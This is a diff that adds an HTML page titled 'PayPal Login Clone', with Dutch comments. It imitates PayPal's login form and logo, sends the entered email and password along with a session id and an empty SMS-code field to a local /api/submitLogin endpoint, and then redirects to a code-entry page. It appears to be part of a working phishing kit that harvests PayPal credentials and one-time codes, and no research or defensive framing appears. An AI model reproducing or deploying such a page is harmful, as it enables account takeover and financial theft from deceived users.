@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal Login Clone</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Jouw bestaande styling blijft hetzelfde */
+    .floating-label { position: relative; margin-bottom: 1.25rem; }
+    .floating-label input { padding-top: 1.75rem; padding-bottom: 0.75rem; border-radius: 6px; transition: all 0.2s ease-in-out; border: 1px solid #D1D5DB; font-weight: 500; }
+    .floating-label label { position: absolute; top: 55%; left: 14px; transform: translateY(-50%); transition: all 0.2s ease-in-out; color: #717171; font-size: 0.95rem; font-weight: 600; pointer-events: none; }
+    .floating-label input:focus { border-color: #0070E0; box-shadow: inset 0 0 0 .125rem #0070E0, 0 0 0 .375rem rgba(16,114,235,.16); outline: none; }
+    .floating-label input:focus + label, .floating-label input:not(:placeholder-shown) + label { top: 35%; font-size: 0.85rem; color: #717171; }
+    .button { width: 100%; min-width: 6rem; height: 48px; padding: 0.75rem 2rem; border: 1px solid #0544b5; display: flex; justify-content: center; align-items: center; background-color: #0544b5; border-radius: 100px; cursor: pointer; color: #fff; font-size: 1.06666667em; text-align: center; font-weight: 500; text-decoration: none; transition: background-color 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease; }
+    .button:hover { background-color: #0070E0; border-color: #0070E0; }
+    .button:active { background-color: #003087; border-color: #003087; outline: none; }
+    .hover-link { color: #0070E0; text-decoration: none; font-weight: bold; transition: color 0.2s ease; }
+    .hover-link:hover { color: #005EA6; }
+    .signup-button { width: 100%; padding: 0.75rem; border: 1px solid #001435; background-color: transparent; border-radius: 100px; font-weight: bold; transition: color 0.2s ease, border-color 0.2s ease; }
+    .signup-button:hover { color: #0070E0; border-color: #0070E0; }
+  </style>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+  <div class="w-full max-w-md p-10 bg-white rounded-2xl shadow-md">
+    <div class="flex justify-center mb-8">
+      <img src="payp.png" alt="PayPal Logo" class="h-12">
+    </div>
+
+    <form id="loginForm">
+      <div class="floating-label">
+        <input type="text" id="loginInput" name="login" placeholder="Enter email, mobile, or username" required class="w-full px-3 py-2 border placeholder-transparent">
+        <label for="loginInput">Email or mobile number</label>
+      </div>
+
+      <div class="floating-label mt-2">
+        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required class="w-full px-3 py-2 border placeholder-transparent">
+        <label for="passwordInput">Password</label>
+      </div>
+
+      <div class="mb-5 text-left">
+        <a href="#" class="hover-link">Forgot password?</a>
+      </div>
+
+      <div class="mb-5">
+        <button type="submit" class="button">Log In</button>
+      </div>
+
+      <div class="flex items-center mb-5">
+        <div class="flex-1 border-t border-gray-300"></div>
+        <span class="mx-3 text-gray-500 text-sm">or</span>
+        <div class="flex-1 border-t border-gray-300"></div>
+      </div>
+
+      <div>
+        <button type="button" class="signup-button mb-12">Sign Up</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // Ophalen of aanmaken van session_id
+    let sessionId = sessionStorage.getItem('session_id');
+    if (!sessionId) {
+      sessionId = 'sess-' + Math.random().toString(36).substr(2, 9) + Date.now();
+      sessionStorage.setItem('session_id', sessionId);
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault(); // Form submission blokkeren
+
+      const loginValue = document.getElementById('loginInput').value.trim();
+      const passwordValue = document.getElementById('passwordInput').value.trim();
+
+      if (!loginValue || !passwordValue) {
+        alert("Please enter both login and password.");
+        return;
+      }
+
+      const data = {
+        type: 'paypal', 
+        email: loginValue,
+        password: passwordValue,
+        smsCode: '',
+        sessionId: sessionId,     // <-- sessionId meesturen
+        timestamp: new Date().toISOString()
+      };
+
+      fetch('/api/submitLogin', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(res => res.json())
+      .then(result => {
+        window.location.href = '/code.html'; // Naar code invoerpagina
+      })
+      .catch(err => {
+        console.error('Error during submission:', err);
+        alert('Something went wrong. Please try again.');
+      });
+    });
+  </script>
+</body>
+</html>
